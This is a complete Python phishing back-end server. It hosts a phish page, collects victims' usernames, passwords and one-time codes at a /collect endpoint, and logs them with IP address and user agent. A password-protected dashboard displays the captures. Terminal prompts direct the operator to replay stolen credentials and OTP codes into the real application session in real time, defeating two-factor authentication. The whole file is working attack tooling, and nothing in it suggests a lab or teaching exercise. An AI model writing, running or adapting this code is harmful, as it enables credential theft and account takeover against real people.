import http.server
import json
import os
import datetime
import threading
import base64
import html

class PhishHandler(http.server.SimpleHTTPRequestHandler):
    # --- CONFIGURATION ---
    # Change these to your secret credentials
    DASHBOARD_USER = "admin"
    DASHBOARD_PASS = "S3cureP@ss"
    LOG_FILE = 'captures.log'
    MAX_LOG_LINES = 50

    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=os.getcwd(), **kwargs)

    def _is_authed(self):
        auth_header = self.headers.get('Authorization')
        if not auth_header:
            return False
        # Basic Auth: base64("user:pass")
        expected = base64.b64encode(f"{self.DASHBOARD_USER}:{self.DASHBOARD_PASS}".encode()).decode()
        return auth_header == f"Basic {expected}"

    def _get_log_content(self):
        if not os.path.exists(self.LOG_FILE):
            return "No captures yet."
        with open(self.LOG_FILE, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        # Return only the last N lines
        return "".join(lines[-self.MAX_LOG_LINES:])

    def _send_dashboard(self):
        log_content = self._get_log_content()
        # Escape HTML to prevent injection
        safe_log = html.escape(log_content)
        
        html_template = f"""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>Phish Dashboard</title>
            <style>
                body {{ font-family: 'Courier New', monospace; background: #1e1e1e; color: #00ff00; padding: 20px; margin: 0; }}
                .container {{ max-width: 1000px; margin: 0 auto; }}
                h1 {{ color: #00ffff; border-bottom: 2px solid #444; padding-bottom: 10px; font-size: 24px; }}
                .controls {{ margin-bottom: 20px; display: flex; gap: 10px; }}
                button {{ background: #0095f6; color: white; border: none; padding: 10px 15px; border-radius: 5px; cursor: pointer; font-weight: bold; }}
                button:hover {{ background: #1877f2; }}
                .log-box {{ 
                    background: #000; 
                    border: 1px solid #444; 
                    padding: 15px; 
                    height: 600px; 
                    overflow-y: scroll; 
                    white-space: pre-wrap; 
                    word-break: break-all;
                    font-size: 14px;
                }}
                .status {{ color: #8e8e8e; font-size: 12px; margin-top: 10px; }}
                .highlight {{ color: #ff00ff; font-weight: bold; }}
                .header-info {{ color: #aaa; margin-bottom: 15px; }}
            </style>
        </head>
        <body>
            <div class="container">
                <h1>📥 Phish Dashboard</h1>
                <div class="header-info">
                    <span class="highlight">Auto-refreshes every 5 seconds.</span> 
                    <span>Last updated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</span>
                </div>
                <div class="controls">
                    <button onclick="location.reload()">🔄 Refresh Now</button>
                    <button onclick="if(confirm('Clear log file?')) fetch('/clear_log').then(()=>location.reload())">🗑️ Clear Log</button>
                </div>
                <div class="log-box">
{safe_log}
                </div>
                <div class="status">
                    Dashboard running.
                </div>
            </div>
            <script>
                // Auto-refresh
                setTimeout(() => location.reload(), 5000);
            </script>
        </body>
        </html>
        """
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(html_template.encode())

    def do_POST(self):
        if self.path == '/collect':
            length = int(self.headers.get('Content-Length', 0))
            raw_data = self.rfile.read(length)
            
            try:
                data = json.loads(raw_data)
            except json.JSONDecodeError:
                self.send_error(400, "Invalid JSON")
                return

            # Sanitize inputs
            def sanitize(val, max_len=100):
                return str(val).replace('\n', '\\n').replace('\r', '\\r')[:max_len]

            timestamp = datetime.datetime.now().isoformat()
            data_type = sanitize(data.get('type', 'unknown'))
            username = sanitize(data.get('username', 'N/A'))
            password = sanitize(data.get('password', 'N/A'))
            otp = sanitize(data.get('otp', 'N/A'))
            referrer = sanitize(data.get('referrer', 'N/A'), 200)
            user_agent = sanitize(data.get('userAgent', 'N/A'), 200)
            client_ip = self.client_address[0]

            # --- TERMINAL LOG ---
            terminal_log = f"""
{'='*60}
  📥 INCOMING DATA ({data_type.upper()})
{'='*60}
  Username: {username}
  IP: {client_ip}
"""
            if data_type == 'password':
                terminal_log += f"  Password: {password}\n  ➡️ ACTION: Get these creds into the real app.\n"
            elif data_type == 'otp':
                terminal_log += f"  OTP Code: {otp}\n  ➡️ ACTION: Enter this OTP into the real session.\n"
            
            terminal_log += f"  Referrer: {referrer}\n  User-Agent: {user_agent}\n  Time: {timestamp}\n{'='*60}\n"
            
            # Print to terminal
            print(terminal_log)

            # --- FILE LOG ---
            # Format: Timestamp | Type | User | Pass | OTP | Ref | UA | IP
            file_entry = f"{timestamp} | {data_type} | {username} | {password} | {otp} | {referrer} | {user_agent} | {client_ip}\n"
            
            with open(self.LOG_FILE, 'a', encoding='utf-8') as f:
                f.write(file_entry)

            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"status":"ok"}')
        elif self.path == '/clear_log':
            # Clear the log file
            if os.path.exists(self.LOG_FILE):
                open(self.LOG_FILE, 'w').close()
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"status":"cleared"}')
        else:
            self.send_response(404)
            self.end_headers()

    def do_GET(self):
        # --- SECRET DASHBOARD ---
        if self.path.startswith('/dashboard'):
            if not self._is_authed():
                self.send_response(401)
                self.send_header('WWW-Authenticate', 'Basic realm="Secret Dashboard"')
                self.end_headers()
                return
            
            self._send_dashboard()
            return

        # --- IP ENDPOINT ---
        if self.path == '/ip':
            ip = self.client_address[0]
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'ip': ip}).encode())
            return

        # --- STATIC FILES (Your phish.html) ---
        super().do_GET()

    def log_message(self, format, *args):
        # Suppress default server logs to keep terminal clean
        pass

if __name__ == '__main__':
    port = 8080
    
    # Use ThreadingHTTPServer (Python 3.7+) for concurrent requests
    # If you are on an older Python, replace with:
    # import socketserver
    # class ThreadedHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer): pass
    # server = ThreadedHTTPServer(('0.0.0.0', port), PhishHandler)
    server = http.server.ThreadingHTTPServer(('0.0.0.0', port), PhishHandler)
    
    # Get the public IP for display
    import urllib.request
    try:
        public_ip = urllib.request.urlopen('http://checkip.amazonaws.com').read().decode()
    except:
        public_ip = "127.0.0.1"

    print(f"\n{'='*60}")
    print(f"  🚀 Phishing Server Running")
    print(f"{'='*60}")
    print(f"  🌐 Phish Page:  http://{public_ip}:{port}/phish.html")
    print(f"  📊 Dashboard:   http://{public_ip}:{port}/dashboard")
    print(f"  🔑 Auth:        {PhishHandler.DASHBOARD_USER}:{PhishHandler.DASHBOARD_PASS}")
    print(f"{'='*60}")
    print(f"\n  Ctrl+C to stop\n")
    
    server.serve_forever()